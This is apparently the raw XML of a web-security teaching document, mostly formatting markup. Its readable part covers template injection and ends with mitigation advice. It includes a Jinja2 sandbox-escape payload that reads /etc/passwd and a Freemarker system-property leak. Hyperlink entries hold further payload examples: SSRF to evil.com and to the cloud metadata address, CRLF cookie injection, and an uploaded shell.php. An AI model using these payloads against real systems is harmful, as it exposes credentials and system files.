        <w:t xml:space="preserve"> disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36AF7119" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>${.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>systemProperties</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>} (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Freemarker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>) → system info leak</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0392A626" w14:textId="6310EBF8" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0052226B">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Advanced Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BFCC005" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>- Chaining SSTI with deserialization for deeper exploits.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5F4CD8" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>- Escaping sandboxes using __class__, __</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>mro</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>__, __subclasses__.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5513C9D1" w14:textId="3D7B81E9" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>- File access: {{ ‘’.__class__.__mro__[1].__subclasses__()[40](‘/etc/passwd’).read() }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73323E79" w14:textId="2E7133BA" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="00D7795D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Mitigation Strategies</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="065B0E6C" w14:textId="77777777" w:rsidR="00001583" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Do not concatenate user input into templates.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A3CDEC" w14:textId="77777777" w:rsidR="00001583" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use safe rendering APIs (Flask </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>render_template</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, not </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>render_template_string</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1325BE6C" w14:textId="77777777" w:rsidR="00001583" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Whitelist allowed variables in templates.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2459B863" w14:textId="77777777" w:rsidR="00001583" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Enable auto-escaping and strict mode in template engines.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE53002" w14:textId="734ACA0F" w:rsidR="0065570D" w:rsidRPr="0065570D" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Validate and sanitize user inputs before passing to templates.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="0065570D" w:rsidRPr="0065570D" w:rsidSect="00D943D1">
      <w:footerReference w:type="default" r:id="rId3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1F5D" w14:textId="77777777" w:rsidR="00C92C20" w:rsidRDefault="00C92C20" w:rsidP="009B2E17">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="1216CCB3" w14:textId="77777777" w:rsidR="00C92C20" w:rsidRDefault="00C92C20" w:rsidP="009B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751269"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="2B8AD3A8" w14:textId="314684B1" w:rsidR="009B2E17" w:rsidRDefault="009B2E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3ABEAF" w14:textId="77777777" w:rsidR="009B2E17" w:rsidRDefault="009B2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F268" w14:textId="77777777" w:rsidR="00C92C20" w:rsidRDefault="00C92C20" w:rsidP="009B2E17">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="3B57A7BE" w14:textId="77777777" w:rsidR="00C92C20" w:rsidRDefault="00C92C20" w:rsidP="009B2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6DA665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AF3925"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1E3075DC"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:isLgl/>
      <w:lvlText w:val="%1.%2"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="722" w:hanging="36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6F212FF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F10C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6A4C5C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A7A2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6C2B6B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="175459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1353C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0EE26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523559"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AC38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302AB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFAE2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A9632C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B18E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5743F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D032C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92672"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="70DAE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B22E1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="926E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44CC5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="CEB479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C8540E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BC76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C37D9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="76BE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E6734"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2EDE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D60BAC"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0DA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65B37"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3F10D7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D781F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0178BA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657DC1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D89C9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64F5B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="545E1FD0"/>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FCD340B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="EDA0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A645B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="981A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007266"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="56C2A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441E25"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D092093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5724F1C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E9EA4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AC6AC1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="777675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DC0DD7"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8818A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A44F4C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D70EC63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E01F05"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D092093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2634E40"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5776A1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C377A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F3F0F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C3CCF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="613A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84368"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="129651BC"/>
    <w:lvl w:ilvl="0" w:tplc="04090001">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="BA7CB0CA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="B2A287DC">
      <w:start w:val="1"/>
      <w:numFmt w:val="upperLetter"/>
      <w:lvlText w:val="%3)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2340" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="313AD65E">
      <w:start w:val="4"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="-"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Cambria" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Cambria" w:cstheme="minorBidi"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3E31C19"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="52863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DE2F83"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FE329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A2C8F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0B92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7E6D91"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6FE2A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420101">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1615402383">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="601914229">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1907521391">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="368142090">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1884519987">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="504127924">
    <w:abstractNumId w:val="38"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1132289463">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="847864004">
    <w:abstractNumId w:val="41"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="2022733892">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="198056791">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="278922948">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="572157651">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="803738864">
    <w:abstractNumId w:val="40"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="1280263943">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="2116317343">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="1166168989">
    <w:abstractNumId w:val="36"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="673335781">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="140192005">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="635842641">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="1792699263">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="634214102">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="955795727">
    <w:abstractNumId w:val="42"/>
  </w:num>
  <w:num w:numId="24" w16cid:durableId="2025667740">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="25" w16cid:durableId="1346056335">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="26" w16cid:durableId="1836609955">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="27" w16cid:durableId="181626438">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="28" w16cid:durableId="1246837478">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="29" w16cid:durableId="73355214">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="30" w16cid:durableId="1462069960">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="31" w16cid:durableId="2136563387">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="32" w16cid:durableId="1584071382">
    <w:abstractNumId w:val="39"/>
  </w:num>
  <w:num w:numId="33" w16cid:durableId="735515409">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="34" w16cid:durableId="779375849">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="35" w16cid:durableId="740635499">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="36" w16cid:durableId="823011390">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="37" w16cid:durableId="1907951494">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="38" w16cid:durableId="341009142">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="39" w16cid:durableId="1753624628">
    <w:abstractNumId w:val="37"/>
  </w:num>
  <w:num w:numId="40" w16cid:durableId="293409850">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="41" w16cid:durableId="1949654068">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="42" w16cid:durableId="902646085">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="43" w16cid:durableId="1388454118">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83"/>
    <w:rsid w:val="000035FF"/>
    <w:rsid w:val="00034616"/>
    <w:rsid w:val="00046F18"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="000842AE"/>
    <w:rsid w:val="000A4657"/>
    <w:rsid w:val="000D7552"/>
    <w:rsid w:val="00137B98"/>
    <w:rsid w:val="001424BC"/>
    <w:rsid w:val="0014730E"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="00154D3F"/>
    <w:rsid w:val="00167E94"/>
    <w:rsid w:val="0017501F"/>
    <w:rsid w:val="00185588"/>
    <w:rsid w:val="00190476"/>
    <w:rsid w:val="001E796A"/>
    <w:rsid w:val="001F67ED"/>
    <w:rsid w:val="00212750"/>
    <w:rsid w:val="00213F0C"/>
    <w:rsid w:val="002220EB"/>
    <w:rsid w:val="002737F4"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="003076DE"/>
    <w:rsid w:val="00321FC0"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00331EB3"/>
    <w:rsid w:val="00353410"/>
    <w:rsid w:val="003A4855"/>
    <w:rsid w:val="003B7AA1"/>
    <w:rsid w:val="003E0CB1"/>
    <w:rsid w:val="003E6A01"/>
    <w:rsid w:val="003F0189"/>
    <w:rsid w:val="00423E65"/>
    <w:rsid w:val="00490592"/>
    <w:rsid w:val="00491EB0"/>
    <w:rsid w:val="00492280"/>
    <w:rsid w:val="004A0CBF"/>
    <w:rsid w:val="004A6A99"/>
    <w:rsid w:val="004B7CA3"/>
    <w:rsid w:val="004D43F7"/>
    <w:rsid w:val="004F78C1"/>
    <w:rsid w:val="0052226B"/>
    <w:rsid w:val="005321D4"/>
    <w:rsid w:val="005537FD"/>
    <w:rsid w:val="005667D4"/>
    <w:rsid w:val="005770B4"/>
    <w:rsid w:val="005A5784"/>
    <w:rsid w:val="005A7039"/>
    <w:rsid w:val="005A70E0"/>
    <w:rsid w:val="005C6100"/>
    <w:rsid w:val="00623E4A"/>
    <w:rsid w:val="00633B56"/>
    <w:rsid w:val="0065570D"/>
    <w:rsid w:val="006572CB"/>
    <w:rsid w:val="00665B58"/>
    <w:rsid w:val="0068351D"/>
    <w:rsid w:val="00697B9D"/>
    <w:rsid w:val="006C5239"/>
    <w:rsid w:val="006E278A"/>
    <w:rsid w:val="00712295"/>
    <w:rsid w:val="00742334"/>
    <w:rsid w:val="00755C65"/>
    <w:rsid w:val="00766792"/>
    <w:rsid w:val="007840D6"/>
    <w:rsid w:val="00794922"/>
    <w:rsid w:val="007A2052"/>
    <w:rsid w:val="007A2F83"/>
    <w:rsid w:val="007F1244"/>
    <w:rsid w:val="00824DDD"/>
    <w:rsid w:val="00871CD4"/>
    <w:rsid w:val="00873C09"/>
    <w:rsid w:val="008845E1"/>
    <w:rsid w:val="008B4DB8"/>
    <w:rsid w:val="008D0DFA"/>
    <w:rsid w:val="008D18C2"/>
    <w:rsid w:val="0090533D"/>
    <w:rsid w:val="0091031D"/>
    <w:rsid w:val="00950E8C"/>
    <w:rsid w:val="0098101F"/>
    <w:rsid w:val="0098113E"/>
    <w:rsid w:val="00985602"/>
    <w:rsid w:val="00987FA0"/>
    <w:rsid w:val="009B1E6F"/>
    <w:rsid w:val="009B2E17"/>
    <w:rsid w:val="009C31F8"/>
    <w:rsid w:val="009C3BFA"/>
    <w:rsid w:val="009E3FBC"/>
    <w:rsid w:val="00A53C90"/>
    <w:rsid w:val="00A6171B"/>
    <w:rsid w:val="00A71108"/>
    <w:rsid w:val="00A73954"/>
    <w:rsid w:val="00A7533A"/>
    <w:rsid w:val="00A77DF9"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00AC0605"/>
    <w:rsid w:val="00AD77A1"/>
    <w:rsid w:val="00B00F14"/>
    <w:rsid w:val="00B12C10"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00B830E7"/>
    <w:rsid w:val="00B86F7C"/>
    <w:rsid w:val="00BA15D1"/>
    <w:rsid w:val="00BC35DD"/>
    <w:rsid w:val="00BC6303"/>
    <w:rsid w:val="00BE02F4"/>
    <w:rsid w:val="00BF47DB"/>
    <w:rsid w:val="00C02290"/>
    <w:rsid w:val="00C02D58"/>
    <w:rsid w:val="00C16006"/>
    <w:rsid w:val="00C24168"/>
    <w:rsid w:val="00C6157F"/>
    <w:rsid w:val="00C63726"/>
    <w:rsid w:val="00C92C20"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00CC14F9"/>
    <w:rsid w:val="00CC2CE6"/>
    <w:rsid w:val="00CD47FD"/>
    <w:rsid w:val="00D03818"/>
    <w:rsid w:val="00D279D4"/>
    <w:rsid w:val="00D75FD2"/>
    <w:rsid w:val="00D77533"/>
    <w:rsid w:val="00D7795D"/>
    <w:rsid w:val="00D865EE"/>
    <w:rsid w:val="00D943D1"/>
    <w:rsid w:val="00DB7FB6"/>
    <w:rsid w:val="00DE7D51"/>
    <w:rsid w:val="00E06105"/>
    <w:rsid w:val="00E269A5"/>
    <w:rsid w:val="00E270C8"/>
    <w:rsid w:val="00E40E61"/>
    <w:rsid w:val="00E428B8"/>
    <w:rsid w:val="00E62D44"/>
    <w:rsid w:val="00E73FED"/>
    <w:rsid w:val="00E85AB8"/>
    <w:rsid w:val="00EF610E"/>
    <w:rsid w:val="00F0518D"/>
    <w:rsid w:val="00F15F47"/>
    <w:rsid w:val="00F43695"/>
    <w:rsid w:val="00F649EA"/>
    <w:rsid w:val="00F8650C"/>
    <w:rsid w:val="00F87855"/>
    <w:rsid w:val="00F93AFC"/>
    <w:rsid w:val="00FB65EA"/>
    <w:rsid w:val="00FB7E7B"/>
    <w:rsid w:val="00FC693F"/>
    <w:rsid w:val="00FD1A0B"/>
    <w:rsid w:val="00FD3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BAFA9"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{FC61B926-F277-477B-AC14-D9BE4B78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43F7"/>
    <w:pPr>
      <w:spacing w:after="100"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004D43F7"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="220"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004D43F7"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="009B2E17"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="440"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC4">
    <w:name w:val="toc 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00E270C8"/>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E270C8"/>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E270C8"/>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E270C8"/>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E270C8"/>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E270C8"/>
    <w:pPr>
      <w:spacing w:after="100" w:line="278" w:lineRule="auto"/>
      <w:ind w:left="1920"/>
    </w:pPr>
    <w:rPr>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E270C8"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="paragraph">
    <w:name w:val="paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00D75F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acimagecontainer">
    <w:name w:val="wacimagecontainer"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00D75FD2"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A6171B"/>
    <w:pPr>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-IN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="NoSpacingChar">
    <w:name w:val="No Spacing Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="NoSpacing"/>
    <w:uiPriority w:val="1"/>
    <w:rsid w:val="006C5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13779">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1001666305">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1053189400">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1254969984">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="13711530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example.com/preview?url=http://evil.com" TargetMode="External" /><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attacker.example" TargetMode="External" /><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="file:///etc/passwd" TargetMode="External" /><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml" /><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image5.jpe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hyperlink" Target="https://victim.example/api/account%20\" TargetMode="External" /><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1:8080/" TargetMode="External"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yperlink" Target="https://attacker.example" TargetMode="External" /><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://victim.example/api/me" TargetMode="External" /><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://169.254.169.254/latest/meta-data/"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example.com/uploads/shell.php" TargetMode="External" /><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="file:///etc/passwd" TargetMode="External"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victim.example/api/account" TargetMode="External" /><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://victim.example/transfer" TargetMode="External" /><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/page?lang=en%0d%0aSet-Cookie:role=admin" TargetMode="External" /><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image3.png" 